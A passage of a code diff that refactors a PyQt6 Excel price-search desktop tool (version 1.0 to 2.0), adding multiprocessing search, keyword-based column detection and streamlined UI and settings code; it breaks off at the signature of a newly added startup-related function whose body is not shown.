@@ -1,230 +1,152 @@
-import sys
-import os
-import winreg
-import json
+"""Excel workbook text search tool."""
+
 import concurrent.futures
-from typing import List, Dict, Tuple
+import json
+import multiprocessing
+import os
+import sys
 import warnings
+import winreg
+from dataclasses import dataclass
+from itertools import chain, islice
+from typing import Iterable, Mapping, Sequence
+
+from openpyxl import load_workbook
+from openpyxl.utils import get_column_letter
+from PyQt6.QtCore import QSettings, QThread, QTimer, Qt, pyqtSignal
+from PyQt6.QtGui import QAction, QColor
+from PyQt6.QtWidgets import (
+    QApplication, QDialog, QDialogButtonBox, QFileDialog, QFormLayout,
+    QGroupBox, QHBoxLayout, QHeaderView, QLabel, QLineEdit, QMainWindow,
+    QMenu, QMessageBox, QProgressBar, QPushButton, QSpinBox,
+    QStyleFactory, QTableWidget, QTableWidgetItem, QVBoxLayout, QWidget,
+)
+from xlrd import open_workbook
 
 warnings.filterwarnings("ignore", category=UserWarning, module="openpyxl")
 
-from openpyxl import load_workbook
-from xlrd import open_workbook
-
-from PyQt6.QtWidgets import (
-    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
-    QLabel, QLineEdit, QPushButton, QProgressBar, QTableWidget,
-    QTableWidgetItem, QHeaderView, QGroupBox, QSpinBox,
-    QMessageBox, QMenu, QStyleFactory, QDialog, QFormLayout,
-    QDialogButtonBox, QFileDialog
-)
-from PyQt6.QtCore import Qt, QThread, pyqtSignal, QSettings, QTimer
-from PyQt6.QtGui import QColor, QAction
-
-VERSION = "1.0"
+VERSION = "2.0"
 APP_NAME = "Excel价格搜索工具 by Sam"
 COMPANY_NAME = "Sam"
+HEADER_SCAN_ROWS = 30
+DEFAULT_MAX_WORKERS = min(8, os.cpu_count() or 4)
+EXCEL_EXTENSIONS = (".xls", ".xlsx", ".xlsm")
+DEFAULT_KEYWORDS = {
+    "description": ["品名", "description", "desc"],
+    "rmb": ["RMB", "人民币", "￥"],
+    "usd": ["USD", "$", "美元"],
+}
+RESULT_FIELDS = (("description", "description"), ("rmb", "rmb_price"), ("usd", "usd_price"))
 
 
+@dataclass
 class SearchResult:
-    def __init__(self):
-        self.file_path = ""
-        self.sheet_name = ""
-        self.cell_address = ""
-        self.cell_value = ""
-        self.description = ""
-        self.rmb_price = ""
-        self.usd_price = ""
+    file_path: str
+    sheet_name: str
+    cell_address: str
+    cell_value: str
+    description: str = ""
+    rmb_price: str = ""
+    usd_price: str = ""
+
+
+def clean_keywords(keywords: Mapping[str, Sequence[str]]) -> dict[str, list[str]]:
+    """Normalize settings and ensure every supported field is present."""
+    return {
+        name: [str(word).strip() for word in keywords.get(name, []) if str(word).strip()]
+        for name in DEFAULT_KEYWORDS
+    }
+
+
+def find_keyword_columns(rows: Iterable[Sequence[object]], keywords: Mapping[str, Sequence[str]]) -> dict[str, int | None]:
+    """Locate the first matching header column for each output field."""
+    columns = dict.fromkeys(DEFAULT_KEYWORDS)
+    normalized = {name: [word.lower() for word in words] for name, words in keywords.items()}
+    for row in rows:
+        for index, value in enumerate(row):
+            if value is None:
+                continue
+            text = str(value).lower()
+            for name, words in normalized.items():
+                if columns[name] is None and any(word in text for word in words):
+                    columns[name] = index
+    return columns
+
+
+def build_result(file_path: str, sheet_name: str, row_number: int, column: int,
+                 value: object, row: Sequence[object], columns: Mapping[str, int | None]) -> SearchResult:
+    details = {}
+    for keyword, field in RESULT_FIELDS:
+        index = columns[keyword]
+        if index is not None and index < len(row) and row[index] is not None:
+            details[field] = str(row[index])
+    return SearchResult(file_path, sheet_name, f"{get_column_letter(column + 1)}{row_number}", str(value), **details)
+
+
+def search_rows(file_path: str, sheet_name: str, rows: Iterable[Sequence[object]],
+                search_term: str, keywords: Mapping[str, Sequence[str]], cancel_event) -> list[SearchResult] | None:
+    iterator = iter(rows)
+    headers = list(islice(iterator, HEADER_SCAN_ROWS))
+    columns = find_keyword_columns(headers, keywords)
+    matches = []
+    for row_number, row in enumerate(chain(headers, iterator), 1):
+        if cancel_event.is_set():
+            return None
+        for column, value in enumerate(row):
+            if value is not None and search_term in str(value).lower():
+                matches.append(build_result(file_path, sheet_name, row_number, column, value, row, columns))
+    return matches
+
+
+def search_file(file_path: str, search_term: str, keywords: dict[str, list[str]], cancel_event) -> tuple[list[SearchResult], bool]:
+    """Search one workbook in a separate process; False means it could not be read."""
+    try:
+        if file_path.lower().endswith(".xls"):
+            workbook = open_workbook(file_path)
+            worksheets = ((sheet.name, (sheet.row_values(i) for i in range(sheet.nrows))) for sheet in workbook.sheets())
+            close = lambda: None
+        else:
+            workbook = load_workbook(file_path, read_only=True, data_only=True)
+            worksheets = ((sheet.title, sheet.iter_rows(values_only=True)) for sheet in workbook.worksheets)
+            close = workbook.close
+        try:
+            results = []
+            for sheet_name, rows in worksheets:
+                matches = search_rows(file_path, sheet_name, rows, search_term, keywords, cancel_event)
+                if matches is None:
+                    return [], True
+                results.extend(matches)
+            return results, True
+        finally:
+            close()
+    except Exception:
+        return [], False
 
 
 class KeywordSettingsDialog(QDialog):
-    def __init__(self, parent=None):
+    def __init__(self, parent: QWidget | None = None):
         super().__init__(parent)
         self.setWindowTitle("关键词设置")
-        self.setup_ui()
+        layout, form = QVBoxLayout(self), QFormLayout()
+        self.inputs = {name: QLineEdit() for name in DEFAULT_KEYWORDS}
+        for name, label in (("description", "品名关键词"), ("rmb", "RMB关键词"), ("usd", "USD关键词")):
+            form.addRow(label, self.inputs[name])
+        layout.addLayout(form)
+        buttons = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel | QDialogButtonBox.StandardButton.Reset)
+        buttons.accepted.connect(self.accept)
+        buttons.rejected.connect(self.reject)
+        buttons.button(QDialogButtonBox.StandardButton.Reset).clicked.connect(self.reset_default)
+        layout.addWidget(buttons)
 
-    def setup_ui(self):
-        layout = QVBoxLayout(self)
-        form_layout = QFormLayout()
+    def reset_default(self) -> None:
+        self.set_keywords(DEFAULT_KEYWORDS)
 
-        self.desc_input = QLineEdit()
-        form_layout.addRow("品名关键词:", self.desc_input)
+    def get_keywords(self) -> dict[str, list[str]]:
+        return clean_keywords({name: input_.text().split(",") for name, input_ in self.inputs.items()})
 
-        self.rmb_input = QLineEdit()
-        form_layout.addRow("RMB关键词:", self.rmb_input)
-
-        self.usd_input = QLineEdit()
-        form_layout.addRow("USD关键词:", self.usd_input)
-
-        layout.addLayout(form_layout)
-
-        button_box = QDialogButtonBox(
-            QDialogButtonBox.StandardButton.Ok |
-            QDialogButtonBox.StandardButton.Cancel |
-            QDialogButtonBox.StandardButton.Reset
-        )
-        button_box.accepted.connect(self.accept)
-        button_box.rejected.connect(self.reject)
-        button_box.button(QDialogButtonBox.StandardButton.Reset).clicked.connect(self.reset_default)
-        layout.addWidget(button_box)
-
-    def reset_default(self):
-        self.desc_input.setText("品名,description,desc")
-        self.rmb_input.setText("RMB,¥")
-        self.usd_input.setText("USD,$,美元")
-
-    def get_keywords(self):
-        return {
-            'description': [k.strip() for k in self.desc_input.text().split(',') if k.strip()],
-            'rmb': [k.strip() for k in self.rmb_input.text().split(',') if k.strip()],
-            'usd': [k.strip() for k in self.usd_input.text().split(',') if k.strip()]
-        }
-
-    def set_keywords(self, keywords):
-        self.desc_input.setText(','.join(keywords.get('description', [])))
-        self.rmb_input.setText(','.join(keywords.get('rmb', [])))
-        self.usd_input.setText(','.join(keywords.get('usd', [])))
-
-
-def search_file_wrapper(args: Tuple[str, str, Dict]) -> Tuple[List[SearchResult], bool]:
-    file_path, search_term, keywords = args
-
-    try:
-        results = []
-
-        if file_path.endswith('.xls'):
-            wb = open_workbook(file_path)
-
-            for sheet in wb.sheets():
-                keyword_cols = {
-                    'description': None,
-                    'rmb': None,
-                    'usd': None
-                }
-
-                for row_idx in range(sheet.nrows):
-                    for col_idx in range(sheet.ncols):
-                        cell_value = str(sheet.cell_value(row_idx, col_idx))
-                        cell_lower = cell_value.lower()
-
-                        # 扫描关键词列号
-                        if keyword_cols['description'] is None:
-                            for kw in keywords['description']:
-                                if kw.lower() in cell_lower:
-                                    keyword_cols['description'] = col_idx
-                                    break
-
-                        if keyword_cols['rmb'] is None:
-                            for kw in keywords['rmb']:
-                                if kw.lower() in cell_lower:
-                                    keyword_cols['rmb'] = col_idx
-                                    break
-
-                        if keyword_cols['usd'] is None:
-                            for kw in keywords['usd']:
-                                if kw.lower() in cell_lower:
-                                    keyword_cols['usd'] = col_idx
-                                    break
-
-                        # 检查搜索目标
-                        if search_term in cell_lower:
-                            result = SearchResult()
-                            result.file_path = file_path
-                            result.sheet_name = sheet.name
-                            result.cell_address = f"{chr(65 + col_idx)}{row_idx + 1}"
-                            result.cell_value = cell_value
-
-                            # 使用记录的列号提取数据
-                            if keyword_cols['description'] is not None:
-                                desc_value = sheet.cell_value(row_idx, keyword_cols['description'])
-                                if desc_value:
-                                    result.description = str(desc_value)
-
-                            if keyword_cols['rmb'] is not None:
-                                rmb_value = sheet.cell_value(row_idx, keyword_cols['rmb'])
-                                if rmb_value:
-                                    result.rmb_price = str(rmb_value)
-
-                            if keyword_cols['usd'] is not None:
-                                usd_value = sheet.cell_value(row_idx, keyword_cols['usd'])
-                                if usd_value:
-                                    result.usd_price = str(usd_value)
-
-                            results.append(result)
-
-        else:
-            workbook = load_workbook(file_path, read_only=True, data_only=True)
-
-            for sheet_name in workbook.sheetnames:
-                worksheet = workbook[sheet_name]
-
-                keyword_cols = {
-                    'description': None,
-                    'rmb': None,
-                    'usd': None
-                }
-
-                for row in worksheet.iter_rows():
-                    for cell in row:
-                        if cell.value is None:
-                            continue
-
-                        cell_value = str(cell.value)
-                        cell_lower = cell_value.lower()
-
-                        # 扫描关键词列号
-                        if keyword_cols['description'] is None:
-                            for kw in keywords['description']:
-                                if kw.lower() in cell_lower:
-                                    keyword_cols['description'] = cell.column
-                                    break
-
-                        if keyword_cols['rmb'] is None:
-                            for kw in keywords['rmb']:
-                                if kw.lower() in cell_lower:
-                                    keyword_cols['rmb'] = cell.column
-                                    break
-
-                        if keyword_cols['usd'] is None:
-                            for kw in keywords['usd']:
-                                if kw.lower() in cell_lower:
-                                    keyword_cols['usd'] = cell.column
-                                    break
-
-                        # 检查搜索目标
-                        if search_term in cell_lower:
-                            result = SearchResult()
-                            result.file_path = file_path
-                            result.sheet_name = sheet_name
-                            result.cell_address = cell.coordinate
-                            result.cell_value = cell_value
-
-                            # 使用记录的列号提取数据
-                            row_num = cell.row
-
-                            if keyword_cols['description'] is not None:
-                                desc_cell = worksheet.cell(row=row_num, column=keyword_cols['description'])
-                                if desc_cell.value:
-                                    result.description = str(desc_cell.value)
-
-                            if keyword_cols['rmb'] is not None:
-                                rmb_cell = worksheet.cell(row=row_num, column=keyword_cols['rmb'])
-                                if rmb_cell.value:
-                                    result.rmb_price = str(rmb_cell.value)
-
-                            if keyword_cols['usd'] is not None:
-                                usd_cell = worksheet.cell(row=row_num, column=keyword_cols['usd'])
-                                if usd_cell.value:
-                                    result.usd_price = str(usd_cell.value)
-
-                            results.append(result)
-
-            workbook.close()
-
-        return results, True
-
-    except Exception as e:
-        return [], False
+    def set_keywords(self, keywords: Mapping[str, Sequence[str]]) -> None:
+        for name, input_ in self.inputs.items():
+            input_.setText(",".join(keywords.get(name, [])))
 
 
 class ExcelSearchWorker(QThread):
@@ -235,448 +157,344 @@ class ExcelSearchWorker(QThread):
     def __init__(self):
         super().__init__()
         self.search_term = ""
-        self.search_paths = []
-        self.max_workers = 16
-        self.keywords = {
-            'description': ['品名', 'description', 'desc'],
-            'rmb': ['RMB', '¥'],
-            'usd': ['USD', '$', '美元']
-        }
-        self.is_running = False
+        self.search_paths: list[str] = []
+        self.max_workers = DEFAULT_MAX_WORKERS
+        self.keywords = clean_keywords(DEFAULT_KEYWORDS)
+        self._running = False
+        self._cancel_event = None
 
-    def setup(self, search_term, search_paths, max_workers=16, keywords=None):
+    def setup(self, search_term: str, search_paths: Sequence[str], max_workers: int, keywords: Mapping[str, Sequence[str]]) -> None:
         self.search_term = search_term.lower().strip()
-        self.search_paths = search_paths
+        self.search_paths = list(search_paths)
         self.max_workers = max_workers
-        if keywords:
-            self.keywords = keywords
+        self.keywords = clean_keywords(keywords)
 
-    def run(self):
-        self.is_running = True
-        all_files = self.collect_files()
+    def run(self) -> None:
+        files = list(self.collect_files())
+        completed = succeeded = failed = found = 0
+        self._running = True
+        with multiprocessing.Manager() as manager:
+            self._cancel_event = manager.Event()
+            with concurrent.futures.ProcessPoolExecutor(max_workers=self.max_workers) as executor:
+                pending, futures = iter(files), set()
 
-        total_files = len(all_files)
-        success_count = 0
-        fail_count = 0
-        found_count = 0
+                def submit_next() -> bool:
+                    try:
+                        file_path = next(pending)
+                    except StopIteration:
+                        return False
+                    futures.add(executor.submit(search_file, file_path, self.search_term, self.keywords, self._cancel_event))
+                    return True
 
-        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
-            future_to_file = {
-                executor.submit(search_file_wrapper, (file_path, self.search_term, self.keywords)): file_path
-                for file_path in all_files
-            }
+                while self._running and len(futures) < self.max_workers and submit_next():
+                    pass
+                while futures and self._running:
+                    done, _ = concurrent.futures.wait(futures, return_when=concurrent.futures.FIRST_COMPLETED)
+                    for future in done:
+                        futures.remove(future)
+                        completed += 1
+                        try:
+                            results, success = future.result()
+                            if success:
+                                succeeded += 1
+                                found += len(results)
+                                if results:
+                                    self.batch_result_signal.emit(results)
+                            else:
+                                failed += 1
+                        except Exception:
+                            failed += 1
+                        self.progress_signal.emit(completed, len(files), found)
+                    while self._running and len(futures) < self.max_workers and submit_next():
+                        pass
+                for future in futures:
+                    future.cancel()
+        self._cancel_event = None
+        self._running = False
+        self.finished_signal.emit(succeeded, failed, found)
 
-            for i, future in enumerate(concurrent.futures.as_completed(future_to_file), 1):
-                if not self.is_running:
-                    break
-
-                try:
-                    results, success = future.result()
-
-                    if success:
-                        success_count += 1
-                        if results:
-                            self.batch_result_signal.emit(results)
-                            found_count += len(results)
-                    else:
-                        fail_count += 1
-
-                    self.progress_signal.emit(i, total_files, found_count)
-
-                except Exception as e:
-                    fail_count += 1
-                    self.progress_signal.emit(i, total_files, found_count)
-
-        self.finished_signal.emit(success_count, fail_count, found_count)
-        self.is_running = False
-
-    def collect_files(self):
-        files = []
+    def collect_files(self) -> Iterable[str]:
         for path in self.search_paths:
             if os.path.isdir(path):
                 for root, _, filenames in os.walk(path):
                     for filename in filenames:
-                        if filename.endswith(('.xlsx', '.xls')) and not filename.startswith(('~$', '$')):
-                            files.append(os.path.join(root, filename))
-        return files
+                        if filename.lower().endswith(EXCEL_EXTENSIONS) and not filename.startswith(("~$", "$")):
+                            yield os.path.join(root, filename)
 
-    def stop(self):
-        self.is_running = False
+    def stop(self) -> None:
+        self._running = False
+        if self._cancel_event is not None:
+            self._cancel_event.set()
 
 
 class ResultTableWidget(QTableWidget):
+    HEADERS = ("文件", "单元格", "单元格内容", "品名", "RMB 价格", "USD 价格")
+
     def __init__(self):
         super().__init__()
-        self.results = []
-        self.init_ui()
-
-    def init_ui(self):
-        self.setColumnCount(6)
-        self.setHorizontalHeaderLabels(["文件", "单元格", "单元格内容", "品名", "RMB价格", "USD价格"])
-
+        self.results: list[SearchResult] = []
+        self.setColumnCount(len(self.HEADERS))
+        self.setHorizontalHeaderLabels(self.HEADERS)
         header = self.horizontalHeader()
-        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
-        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Fixed)
-        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
-        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
-        header.setSectionResizeMode(4, QHeaderView.ResizeMode.Fixed)
-        header.setSectionResizeMode(5, QHeaderView.ResizeMode.Fixed)
-
-        self.setColumnWidth(1, 60)
-        self.setColumnWidth(4, 80)
-        self.setColumnWidth(5, 80)
-
+        for column in (0, 2, 3):
+            header.setSectionResizeMode(column, QHeaderView.ResizeMode.Stretch)
+        for column, width in ((1, 60), (4, 80), (5, 80)):
+            header.setSectionResizeMode(column, QHeaderView.ResizeMode.Fixed)
+            self.setColumnWidth(column, width)
         self.setAlternatingRowColors(True)
         self.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
         self.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
-
         self.doubleClicked.connect(self.open_excel_file)
         self.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
         self.customContextMenuRequested.connect(self.show_context_menu)
 
-    def open_excel_file(self):
-        current_row = self.currentRow()
-        if 0 <= current_row < len(self.results):
-            result = self.results[current_row]
-            if os.path.exists(result.file_path):
-                try:
-                    os.startfile(result.file_path)
-                except:
-                    pass
+    @staticmethod
+    def text_item(value: str) -> QTableWidgetItem:
+        item = QTableWidgetItem(value)
+        item.setToolTip(value)
+        return item
 
-    def add_batch_results(self, results):
+    def add_batch_results(self, results: list[SearchResult]) -> None:
         start_row = self.rowCount()
         self.results.extend(results)
-
         self.setRowCount(start_row + len(results))
-
-        for i, result in enumerate(results):
-            row = start_row + i
-
-            file_item = QTableWidgetItem(os.path.basename(result.file_path))
+        for offset, result in enumerate(results):
+            row = start_row + offset
+            file_item = self.text_item(os.path.basename(result.file_path))
             file_item.setToolTip(result.file_path)
-            file_item.setData(Qt.ItemDataRole.UserRole, result)
             self.setItem(row, 0, file_item)
-
-            cell_item = QTableWidgetItem(result.cell_address)
-            cell_item.setToolTip(result.cell_address)
-            self.setItem(row, 1, cell_item)
-
-            content_item = QTableWidgetItem(result.cell_value)
-            content_item.setToolTip(result.cell_value)
-            self.setItem(row, 2, content_item)
-
-            desc_item = QTableWidgetItem(result.description)
-            desc_item.setToolTip(result.description)
-            self.setItem(row, 3, desc_item)
-
+            for column, value in enumerate((result.cell_address, result.cell_value, result.description), 1):
+                self.setItem(row, column, self.text_item(value))
             self.set_price_item(row, 4, result.rmb_price, "#0070c0")
             self.set_price_item(row, 5, result.usd_price, "#c00000")
 
-    def set_price_item(self, row, col, price, color):
-        item = QTableWidgetItem(price)
-        item.setToolTip(price)
-        if price and any(char.isdigit() for char in price):
+    def set_price_item(self, row: int, column: int, price: str, color: str) -> None:
+        item = self.text_item(price)
+        if price and any(character.isdigit() for character in price):
             item.setForeground(QColor(color))
-        self.setItem(row, col, item)
+        self.setItem(row, column, item)
 
-    def clear_results(self):
+    def clear_results(self) -> None:
         self.results.clear()
         self.setRowCount(0)
 
-    def show_context_menu(self, pos):
+    def selected_result(self) -> SearchResult | None:
+        row = self.currentRow()
+        return self.results[row] if 0 <= row < len(self.results) else None
+
+    def open_excel_file(self) -> None:
+        if result := self.selected_result():
+            if os.path.exists(result.file_path):
+                os.startfile(result.file_path)
+
+    def show_context_menu(self, position) -> None:
         menu = QMenu(self)
-
-        copy_action = QAction("复制", self)
+        copy_action = menu.addAction("复制")
         copy_action.triggered.connect(self.copy_cell_content)
-        menu.addAction(copy_action)
-
         menu.addSeparator()
-
-        open_file_action = QAction("打开文件", self)
+        open_file_action = menu.addAction("打开文件")
         open_file_action.triggered.connect(self.open_excel_file)
-        menu.addAction(open_file_action)
+        location_action = menu.addAction("打开文件所在目录")
+        location_action.triggered.connect(self.open_file_location)
+        menu.exec(self.mapToGlobal(position))
 
-        open_action = QAction("打开文件所在目录", self)
-        open_action.triggered.connect(self.open_file_location)
-        menu.addAction(open_action)
+    def copy_cell_content(self) -> None:
+        if item := self.currentItem():
+            QApplication.clipboard().setText(item.text())
 
-        menu.exec(self.mapToGlobal(pos))
-
-    def copy_cell_content(self):
-        current_item = self.currentItem()
-        if current_item:
-            QApplication.clipboard().setText(current_item.text())
-
-    def open_file_location(self):
-        selected_rows = set(item.row() for item in self.selectedItems())
-        for row in selected_rows:
+    def open_file_location(self) -> None:
+        for row in {item.row() for item in self.selectedItems()}:
             if row < len(self.results):
-                result = self.results[row]
-                if os.path.exists(result.file_path):
-                    os.startfile(os.path.dirname(result.file_path))
+                os.startfile(os.path.dirname(self.results[row].file_path))
 
 
 class ExcelSearchTool(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.search_worker = None
+        self.search_worker: ExcelSearchWorker | None = None
         self.settings = QSettings(COMPANY_NAME, APP_NAME)
-        self.search_history = []
-        self.custom_keywords = {
-            'description': ['品名', 'description', 'desc'],
-            'rmb': ['RMB', '¥'],
-            'usd': ['USD', '$', '美元']
-        }
-
+        self.search_history: list[str] = []
+        self.custom_keywords = clean_keywords(DEFAULT_KEYWORDS)
         self.setWindowTitle(f"{APP_NAME} v{VERSION}")
         self.resize(700, 550)
         self.init_ui()
         self.load_settings()
         self.center_window()
 
-    def center_window(self):
-        screen = QApplication.primaryScreen().geometry()
-        size = self.geometry()
-        self.move((screen.width() - size.width()) // 2, (screen.height() - size.height()) // 2)
-
-    def init_ui(self):
+    def init_ui(self) -> None:
         central = QWidget()
         self.setCentralWidget(central)
         layout = QVBoxLayout(central)
-        layout.setContentsMargins(10, 10, 10, 10)
-        layout.setSpacing(10)
-
         layout.addWidget(self.create_search_group())
-        layout.addLayout(self.create_progress_layout())
-        layout.addWidget(self.create_result_group())
+        self.progress_bar = QProgressBar()
         self.progress_bar.setFormat("就绪")
+        layout.addWidget(self.progress_bar)
+        group = QGroupBox("搜索结果")
+        result_layout = QVBoxLayout(group)
+        self.result_table = ResultTableWidget()
+        result_layout.addWidget(self.result_table)
+        layout.addWidget(group)
 
-    def create_search_group(self):
+    def create_search_group(self) -> QGroupBox:
         group = QGroupBox("搜索设置")
         layout = QVBoxLayout(group)
-
-        row1 = QHBoxLayout()
-        row1.addWidget(QLabel("搜索关键词:"))
+        keyword_row = QHBoxLayout()
+        keyword_row.addWidget(QLabel("搜索关键词"))
         self.keyword_input = QLineEdit()
         self.keyword_input.returnPressed.connect(self.start_search)
-        row1.addWidget(self.keyword_input)
-
-        history_btn = QPushButton("历史")
-        history_btn.clicked.connect(self.show_history)
-        row1.addWidget(history_btn)
-
-        keyword_btn = QPushButton("关键词设置")
-        keyword_btn.clicked.connect(self.show_keyword_settings)
-        row1.addWidget(keyword_btn)
-
-        layout.addLayout(row1)
-
-        row2 = QHBoxLayout()
-        row2.addWidget(QLabel("搜索文件夹:"))
+        keyword_row.addWidget(self.keyword_input)
+        for label, callback in (("历史", self.show_history), ("关键词设置", self.show_keyword_settings)):
+            button = QPushButton(label)
+            button.clicked.connect(callback)
+            keyword_row.addWidget(button)
+        layout.addLayout(keyword_row)
+        folder_row = QHBoxLayout()
+        folder_row.addWidget(QLabel("搜索文件夹"))
         self.folder_input = QLineEdit()
         self.folder_input.setReadOnly(True)
-        row2.addWidget(self.folder_input)
-
-        folder_btn = QPushButton("选择文件夹")
-        folder_btn.clicked.connect(self.select_folder)
-        row2.addWidget(folder_btn)
-
-        layout.addLayout(row2)
-
-        row3 = QHBoxLayout()
-        row3.addWidget(QLabel("最大并发:"))
+        folder_row.addWidget(self.folder_input)
+        folder_button = QPushButton("选择文件夹")
+        folder_button.clicked.connect(self.select_folder)
+        folder_row.addWidget(folder_button)
+        layout.addLayout(folder_row)
+        action_row = QHBoxLayout()
+        action_row.addWidget(QLabel("并发文件数"))
         self.thread_spin = QSpinBox()
         self.thread_spin.setRange(1, 32)
-        self.thread_spin.setValue(16)
-        row3.addWidget(self.thread_spin)
-        row3.addStretch()
-
+        self.thread_spin.setValue(DEFAULT_MAX_WORKERS)
+        action_row.addWidget(self.thread_spin)
+        action_row.addStretch()
         self.search_btn = QPushButton("开始搜索")
         self.search_btn.clicked.connect(self.start_search)
-        self.search_btn.setStyleSheet("""
-            QPushButton {
-                background-color: #4CAF50;
-                color: white;
-                font-weight: bold;
-                padding: 8px 16px;
-                border-radius: 4px;
-            }
-            QPushButton:hover {
-                background-color: #45a049;
-            }
-            QPushButton:disabled {
-                background-color: #cccccc;
-            }
-        """)
-        row3.addWidget(self.search_btn)
-
+        action_row.addWidget(self.search_btn)
         self.stop_btn = QPushButton("停止搜索")
         self.stop_btn.clicked.connect(self.stop_search)
         self.stop_btn.setEnabled(False)
-        row3.addWidget(self.stop_btn)
-
-        layout.addLayout(row3)
-
+        action_row.addWidget(self.stop_btn)
+        layout.addLayout(action_row)
         return group
 
-    def create_progress_layout(self):
-        layout = QHBoxLayout()
+    def center_window(self) -> None:
+        screen = QApplication.primaryScreen().availableGeometry()
+        self.move(screen.center() - self.rect().center())
 
-        self.progress_bar = QProgressBar()
-        self.progress_bar.setTextVisible(True)
-        layout.addWidget(self.progress_bar)
+    def load_settings(self) -> None:
+        if path := self.settings.value("last_search_path", ""):
+            if os.path.isdir(path):
+                self.folder_input.setText(path)
+        self.thread_spin.setValue(self.settings.value("thread_count", DEFAULT_MAX_WORKERS, type=int))
+        self.search_history = list(self.settings.value("search_history", []))
+        try:
+            self.custom_keywords = clean_keywords(json.loads(self.settings.value("custom_keywords", "")))
+        except (TypeError, json.JSONDecodeError):
+            pass
 
-        return layout
-
-    def create_result_group(self):
-        group = QGroupBox("搜索结果")
-        layout = QVBoxLayout(group)
-        self.result_table = ResultTableWidget()
-        layout.addWidget(self.result_table)
-        return group
-
-    def load_settings(self):
-        last_path = self.settings.value("last_search_path", "")
-        if last_path and os.path.exists(last_path):
-            self.folder_input.setText(last_path)
-
-        self.thread_spin.setValue(self.settings.value("thread_count", 16, type=int))
-
-        history = self.settings.value("search_history", [])
-        if history:
-            self.search_history = history
-
-        keywords_json = self.settings.value("custom_keywords", "")
-        if keywords_json:
-            try:
-                self.custom_keywords = json.loads(keywords_json)
-            except:
-                pass
-
-    def save_settings(self):
+    def save_settings(self) -> None:
         self.settings.setValue("thread_count", self.thread_spin.value())
         self.settings.setValue("search_history", self.search_history[-20:])
-        self.settings.setValue("custom_keywords", json.dumps(self.custom_keywords))
+        self.settings.setValue("custom_keywords", json.dumps(self.custom_keywords, ensure_ascii=False))
 
-    def select_folder(self):
-        folder = QFileDialog.getExistingDirectory(self, "选择文件夹")
-        if folder:
+    def select_folder(self) -> None:
+        if folder := QFileDialog.getExistingDirectory(self, "选择文件夹"):
             self.folder_input.setText(folder)
             self.settings.setValue("last_search_path", folder)
 
-    def show_keyword_settings(self):
+    def show_keyword_settings(self) -> None:
         dialog = KeywordSettingsDialog(self)
         dialog.set_keywords(self.custom_keywords)
-
         if dialog.exec() == QDialog.DialogCode.Accepted:
             self.custom_keywords = dialog.get_keywords()
             self.save_settings()
 
-    def start_search(self):
-        keyword = self.keyword_input.text().strip()
+    def start_search(self) -> None:
+        keyword, folder = self.keyword_input.text().strip(), self.folder_input.text().strip()
         if not keyword:
             QMessageBox.warning(self, "提示", "请输入搜索关键词")
             return
-
-        folder = self.folder_input.text().strip()
-        if not folder or not os.path.isdir(folder):
+        if not os.path.isdir(folder):
             QMessageBox.warning(self, "提示", "请选择有效的文件夹")
             return
-
         if keyword not in self.search_history:
             self.search_history.append(keyword)
-
         self.result_table.clear_results()
         self.search_btn.setEnabled(False)
         self.stop_btn.setEnabled(True)
         self.progress_bar.setValue(0)
-        self.progress_bar.setFormat("准备搜索...")
-
+        self.progress_bar.setFormat("准备搜索…")
         self.search_worker = ExcelSearchWorker()
         self.search_worker.setup(keyword, [folder], self.thread_spin.value(), self.custom_keywords)
-
         self.search_worker.progress_signal.connect(self.update_progress)
         self.search_worker.batch_result_signal.connect(self.result_table.add_batch_results)
         self.search_worker.finished_signal.connect(self.search_finished)
-
         self.search_worker.start()
 
-    def stop_search(self):
+    def stop_search(self) -> None:
         if self.search_worker and self.search_worker.isRunning():
             self.search_worker.stop()
-            self.search_btn.setEnabled(True)
             self.stop_btn.setEnabled(False)
 
-    def update_progress(self, current, total, found):
-        if total > 0:
-            percent = int((current / total) * 100)
-            self.progress_bar.setValue(percent)
-            self.progress_bar.setFormat(f"正在搜索: {current}/{total} ({percent}%) - 已找到: {found}")
-        else:
-            self.progress_bar.setFormat(f"正在搜索 - 已找到: {found}")
+    def update_progress(self, current: int, total: int, found: int) -> None:
+        percentage = int(current / total * 100) if total else 0
+        self.progress_bar.setValue(percentage)
+        self.progress_bar.setFormat(f"正在搜索：{current}/{total} ({percentage}%) — 已找到 {found} 条")
 
-    def search_finished(self, success, fail, found):
+    def search_finished(self, success: int, failed: int, found: int) -> None:
         self.search_btn.setEnabled(True)
         self.stop_btn.setEnabled(False)
         self.progress_bar.setValue(100)
-
-        self.progress_bar.setFormat(f"搜索完成! 共找到 {found} 个结果 (成功: {success}, 失败: {fail})")
-
-        if found > 0:
+        self.progress_bar.setFormat(f"搜索完成：找到 {found} 条（成功：{success}，失败：{failed}）")
+        if found:
             QApplication.beep()
-
         self.save_settings()
 
-    def show_history(self):
+    def show_history(self) -> None:
         if not self.search_history:
             return
-
         menu = QMenu(self)
         for keyword in reversed(self.search_history[-10:]):
-            action = QAction(keyword, self)
-            action.triggered.connect(lambda checked, k=keyword: self.set_and_search(k))
-            menu.addAction(action)
-
+            action = menu.addAction(keyword)
+            action.triggered.connect(lambda _, value=keyword: self.set_and_search(value))
         menu.addSeparator()
-        clear_action = QAction("清空历史", self)
+        clear_action = menu.addAction("清空历史")
         clear_action.triggered.connect(self.clear_history)
-        menu.addAction(clear_action)
-
         menu.exec(self.cursor().pos())
 
-    def set_and_search(self, keyword):
+    def set_and_search(self, keyword: str) -> None:
         self.keyword_input.setText(keyword)
         QTimer.singleShot(100, self.start_search)
 
-    def clear_history(self):
+    def clear_history(self) -> None:
         self.search_history.clear()
         self.save_settings()
 
-    def closeEvent(self, event):
+    def closeEvent(self, event) -> None:
         if self.search_worker and self.search_worker.isRunning():
             self.search_worker.stop()
-            self.search_worker.wait(2000)
-
+            self.search_worker.wait(2_000)
         self.save_settings()
         event.accept()
 
 
-def main():
+def register_updater_startup() -> None:
